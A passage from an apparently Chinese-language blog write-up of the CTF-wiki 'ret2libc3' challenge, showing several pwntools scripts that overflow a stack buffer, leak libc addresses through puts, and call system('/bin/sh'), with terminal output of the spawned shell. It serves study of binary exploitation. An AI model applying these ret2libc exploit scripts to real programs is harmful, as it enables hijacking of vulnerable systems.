b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\x84\x04\x08\xd0\x84\x04\x08\x18\xa0\x04\x08&#x27;</span><br><span class="hljs-string">/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="hljs-string">puts_addr_raw:  b&#x27; 2\xc7\xf7&#x27;</span><br><span class="hljs-string">puts_addr:  4157026848</span><br><span class="hljs-string">hex(puts_addr):  0xf7c73220</span><br><span class="hljs-string">=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6_2.37-5_i386</span><br><span class="hljs-string">1 - libc6_2.32-0experimental0_amd64</span><br><span class="hljs-string">2 - libc6_2.37-6_i386</span><br><span class="hljs-string">3 - libc6-amd64_2.32-0experimental0_i386</span><br><span class="hljs-string">4 - libc6-amd64_2.8~20080505-0ubuntu9_i386</span><br><span class="hljs-string">5 - libc6_2.32-0experimental1_amd64</span><br><span class="hljs-string">6 - libc6-amd64_2.32-0experimental1_i386</span><br><span class="hljs-string">7 - libc6_2.8~20080505-0ubuntu9_amd64</span><br><span class="hljs-string">8 - libc6_2.37-7_i386</span><br><span class="hljs-string">[+] Choose one : 0</span><br><span class="hljs-string">hex(base):  0xf7c00000</span><br><span class="hljs-string">hex(system_addr):  0xf7c4c8a0</span><br><span class="hljs-string">hex(bin_addr):  0xf7db5fc8</span><br><span class="hljs-string">payload2:  b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xc8\xc4\xf7\xd2\x04\x00\x00\xc8_\xdb\xf7&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp2.py  exp-clean.py  exp.py  ret2libc3</span><br><span class="hljs-string">$  </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831104244.png" alt="image.png"></p><h3 id="libc-database"><a href="#libc-database" class="headerlink" title="libc-database"></a>libc-database</h3><p><a href="https://libc.rip/">https://libc.rip/</a></p><p>从上面的运行结果中可以看到，puts函数的真实地址为：0xf7c73220<br>末尾220为12位，输入工具中进行查找，可以看到右边的第一个就是我们上面输入的0所对应的<a href="https://libc.rip/#">libc6_2.37-5_i386</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831112025.png" alt="image.png"></p><h2 id="exp-clean-exp-删掉了注释"><a href="#exp-clean-exp-删掉了注释" class="headerlink" title="exp-clean   exp 删掉了注释"></a>exp-clean   exp 删掉了注释</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>start = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br><br><span class="hljs-comment"># payload = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + puts_plt + start + puts_got  # 报错：TypeError: can&#x27;t concat int to bytes</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">108</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(puts_plt) + p32(start) + p32(puts_got) <span class="hljs-comment"># 正确写法</span><br>io.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br>puts_addr_raw = io.recv(<span class="hljs-number">4</span>)<br>puts_addr = u32(puts_addr_raw)<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>base = puts_addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>system_addr = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>sh_addr = base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;0xdeadbeaf&#x27; + p32(sh_addr) # 错误写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;\x0f\x0b\x0f\x0b&#x27; + p32(sh_addr) # 正确写法</span><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">108</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(system_addr) + <span class="hljs-string">b&#x27;1234&#x27;</span> + p32(sh_addr) <span class="hljs-comment"># 正确写法</span><br>io.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload2)<br>io.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">┌──(root㉿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">└─# python exp-clean.py                                                                              </span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc3&#x27;: pid 18209</span><br><span class="hljs-string">[*] &#x27;/root/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br><span class="hljs-string">    Arch:     i386-32-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x8048000)</span><br><span class="hljs-string">/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6_2.37-5_i386</span><br><span class="hljs-string">1 - libc6_2.32-0experimental0_amd64</span><br><span class="hljs-string">2 - libc6_2.37-6_i386</span><br><span class="hljs-string">3 - libc6-amd64_2.32-0experimental0_i386</span><br><span class="hljs-string">4 - libc6-amd64_2.8~20080505-0ubuntu9_i386</span><br><span class="hljs-string">5 - libc6_2.32-0experimental1_amd64</span><br><span class="hljs-string">6 - libc6-amd64_2.32-0experimental1_i386</span><br><span class="hljs-string">7 - libc6_2.8~20080505-0ubuntu9_amd64</span><br><span class="hljs-string">8 - libc6_2.37-7_i386</span><br><span class="hljs-string">[+] Choose one : 0</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp2.py  exp-clean.py  exp.py  ret2libc3</span><br><span class="hljs-string">$ </span><br><span class="hljs-string">[*] Interrupted</span><br><span class="hljs-string">[*] Stopped process &#x27;./ret2libc3&#x27; (pid 18209)</span><br><span class="hljs-string">                                                                                                                                                                                                                                          </span><br><span class="hljs-string">┌──(root㉿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">└─# </span><br><span class="hljs-string">                                                                                                                                                                                                                                          </span><br><span class="hljs-string">┌──(root㉿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">└─# </span><br><span class="hljs-string">       </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831104550.png" alt="image.png"></p><h2 id="exp2：泄露setvbuf函数的真实地址"><a href="#exp2：泄露setvbuf函数的真实地址" class="headerlink" title="exp2：泄露setvbuf函数的真实地址"></a>exp2：泄露setvbuf函数的真实地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入 pwntools 库，这是一个用于二进制漏洞利用的强大工具库。</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 导入 LibcSearcher，这是一个用于从函数地址中搜索libc版本和提取libc函数地址的工具。</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br><span class="hljs-comment"># 创建一个新的进程，执行名为 ret2libc3 的可执行文件。这将用于在本地系统上执行漏洞利用。</span><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><span class="hljs-comment"># 将 ret2libc3 可执行文件加载到 elf 对象中，以便从中获取有关程序结构的信息，例如函数地址和GOT地址。</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== 通过泄露 setvbuf 函数的地址 ===&quot;</span>)<br><span class="hljs-comment"># 获取 puts 函数的 PLT（Procedure Linkage Table）地址和 GOT（Global Offset Table）地址。</span><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>setvbuf_got = elf.got[<span class="hljs-string">&quot;setvbuf&quot;</span>]<br><span class="hljs-comment"># 获取程序的 _start 符号的地址，这通常是程序的入口点。</span><br>start_addr=elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_plt: &quot;</span>, puts_plt)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setvbuf_got: &quot;</span>, setvbuf_got)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(setvbuf_got): &quot;</span>, <span class="hljs-built_in">hex</span>(setvbuf_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start_addr: &quot;</span>, start_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(start_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(start_addr))<br><span class="hljs-comment"># 构建一个 payload，其中包括 112 个字节的填充（用于填充到返回地址之前），然后是 puts 函数的 PLT 地址、程序入口点地址和 setvbuf 函数的 GOT 地址。这将在程序中触发漏洞。</span><br>payload1 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,puts_plt,start_addr,setvbuf_got])<br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + puts_plt + start + setvbuf_got  # 报错：TypeError: can&#x27;t concat int to bytes</span><br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(puts_plt) + p32(start) + p32(setvbuf_got) # 正确写法</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload1: &quot;</span>, payload1)<br><span class="hljs-comment"># 发送构建好的 payload1 到程序。</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload1)<br><span class="hljs-comment"># 接收从程序中泄露的 puts 函数的地址，并将其转换为整数。这将帮助确定libc的基址。</span><br><span class="hljs-comment"># io.recv(4)接受程序返回的二进制 大小为4字节  u32()为保存为无符号的32位</span><br>setvbuf_addr_raw = io.recv(<span class="hljs-number">4</span>)<br>setvbuf_addr = u32(setvbuf_addr_raw) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setvbuf_addr_raw: &quot;</span>, setvbuf_addr_raw)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setvbuf_addr: &quot;</span>, setvbuf_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(setvbuf_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(setvbuf_addr))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===&quot;</span>)<br><span class="hljs-comment"># 使用 LibcSearcher 工具，根据泄露的 puts 函数地址来搜索libc库并提取相关信息。</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;setvbuf&#x27;</span>,setvbuf_addr)<br><span class="hljs-comment"># 计算libc的基址，这是通过从 puts 函数地址中减去 puts 在libc中的偏移得到的。</span><br>base = setvbuf_addr-libc.dump(<span class="hljs-string">&#x27;setvbuf&#x27;</span>)<br><span class="hljs-comment"># 计算 system 函数和 /bin/sh 字符串的地址，这将用于后续的漏洞利用。</span><br>system_addr = base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment"># 构建第二个 payload，其中包括 112 个字节的填充，然后是计算得到的 system 函数地址、随意的返回地址（1234），以及计算得到的 /bin/sh 字符串地址。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(base): &quot;</span>, <span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(system_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(bin_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(bin_addr))<br>payload2 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,system_addr,<span class="hljs-number">1234</span>,bin_addr])<br><span class="hljs-comment"># 使用p32函数将整数转换为对应的4字节二进制字符串</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;0xdeadbeaf&#x27; + p32(sh_addr) # 错误写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;\x0f\x0b\x0f\x0b&#x27; + p32(sh_addr) # 正确写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;1234&#x27; + p32(sh_addr) # 正确写法</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload2: &quot;</span>, payload2)<br><span class="hljs-comment"># 发送构建好的 payload2 到程序，触发第二阶段的漏洞利用，旨在获取系统 Shell。</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload2)<br><span class="hljs-comment"># 与程序进行交互，获取系统 Shell，进入交互式命令模式。</span><br>io.interactive()<br><br><span class="hljs-string">&quot;&quot;&quot;                                                            </span><br><span class="hljs-string">┌──(root㉿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">└─# python exp2.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc3&#x27;: pid 21841</span><br><span class="hljs-string">[*] &#x27;/root/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br><span class="hljs-string">    Arch:     i386-32-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x8048000)</span><br><span class="hljs-string">=== 通过泄露 setvbuf 函数的地址 ===</span><br><span class="hljs-string">puts_plt:  134513760</span><br><span class="hljs-string">hex(puts_plt):  0x8048460</span><br><span class="hljs-string">setvbuf_got:  134520872</span><br><span class="hljs-string">hex(setvbuf_got):  0x804a028</span><br><span class="hljs-string">start_addr:  134513872</span><br><span class="hljs-string">hex(start_addr):  0x80484d0</span><br><span class="hljs-string">payload1:  b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\x84\x04\x08\xd0\x84\x04\x08(\xa0\x04\x08&#x27;</span><br><span class="hljs-string">/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="hljs-string">setvbuf_addr_raw:  b&#x27;\x80:\xc7\xf7&#x27;</span><br><span class="hljs-string">setvbuf_addr:  4157028992</span><br><span class="hljs-string">hex(setvbuf_addr):  0xf7c73a80</span><br><span class="hljs-string">=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6-amd64_2.31-0ubuntu9.4_i386</span><br><span class="hljs-string">1 - libc6_2.3.2.ds1-13ubuntu2.3_amd64</span><br><span class="hljs-string">2 - libc6_2.37-5_i386</span><br><span class="hljs-string">3 - libc-2.33.9000-40.fc35.i686</span><br><span class="hljs-string">4 - libc6_2.11.1-0ubuntu7.14_i386</span><br><span class="hljs-string">5 - libc-2.33.9000-42.fc35.i686</span><br><span class="hljs-string">6 - libc6-amd64_2.31-0ubuntu9.5_i386</span><br><span class="hljs-string">7 - libc6_2.3.2.ds1-13ubuntu2.2_amd64</span><br><span class="hljs-string">8 - libc6_2.37-6_i386</span><br><span class="hljs-string">9 - libc-2.33.9000-43.fc35.i686</span><br><span class="hljs-string">[+] Choose one : 2</span><br><span class="hljs-string">hex(base):  0xf7c00000</span><br><span class="hljs-string">hex(system_addr):  0xf7c4c8a0</span><br><span class="hljs-string">hex(bin_addr):  0xf7db5fc8</span><br><span class="hljs-string">payload2:  b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xc8\xc4\xf7\xd2\x04\x00\x00\xc8_\xdb\xf7&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp2.py  exp33.py  exp-clean.py  exp.py  ret2libc3</span><br><span class="hljs-string">$  </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831121835.png" alt="image.png"></p><p>可以看到有很多个libc版本，可以1个1个的试(因为程序为32位的，所以可以选择性的把64位的去掉)<br>另外一个办法就是查看libc-database，找到可用的libc，直接选择对应的libc序号即可</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831122046.png" alt="image.png"></p><h2 id="exp3：利用-libc-start-main泄露"><a href="#exp3：利用-libc-start-main泄露" class="headerlink" title="exp3：利用__libc_start_main泄露"></a>exp3：利用__libc_start_main泄露</h2><p>官方的题解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">基本利用思路如下：</span><br><span class="hljs-string">1）泄露 __libc_start_main 地址</span><br><span class="hljs-string">2）获取 libc 版本</span><br><span class="hljs-string">3）获取 system 地址与 /bin/sh 的地址</span><br><span class="hljs-string">4）再次执行源程序</span><br><span class="hljs-string">5）触发栈溢出执行 system(‘/bin/sh’)</span><br><span class="hljs-string"></span><br><span class="hljs-string">1）详细介绍：</span><br><span class="hljs-string">a. 当你将puts函数的地址放在栈上，然后通过控制程序流使其执行puts函数，程序会跳转到puts函数的代码，开始执行它。而puts函数通常用于将一个以null结尾的字符串输出到标准输出（终端）。</span><br><span class="hljs-string">b. 在这种情况下，你将__libc_start_main的GOT（Global Offset Table，全局偏移表）地址作为参数传递给了puts函数。这个GOT表是一个特殊的数据结构，包含了程序中需要调用的外部库函数的地址。其中，__libc_start_main函数在程序启动时被调用，因此GOT表中存储了对该函数的引用。</span><br><span class="hljs-string">c. 当puts函数被执行时，它会根据传递的地址从GOT表中读取数据，然后将这些数据输出到终端。由于你传递的是__libc_start_main的GOT表地址，puts函数实际上会输出__libc_start_main函数的地址。</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><span class="hljs-comment"># context(os=&quot;linux&quot;, log_level=&#x27;debug&#x27;)</span><br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_plt = ret2libc3.plt[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libc_start_main_got): &quot;</span>, <span class="hljs-built_in">hex</span>(libc_start_main_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libc_start_main_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(libc_start_main_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(main): &quot;</span>, <span class="hljs-built_in">hex</span>(main))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br><span class="hljs-comment"># sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)</span><br>sh.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get the related addr&quot;</span>)<br>libc_start_main_addr_raw = sh.recv(<span class="hljs-number">4</span>)<br>libc_start_main_addr = u32(libc_start_main_addr_raw) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_start_main_addr_raw: &quot;</span>, libc_start_main_addr_raw)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_start_main_addr: &quot;</span>, libc_start_main_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libc_start_main_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(libc_start_main_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libcbase): &quot;</span>, <span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(system_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(binsh_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get shell&quot;</span>)<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>kali系统直接跑，没有跑出来结果</p><p><img 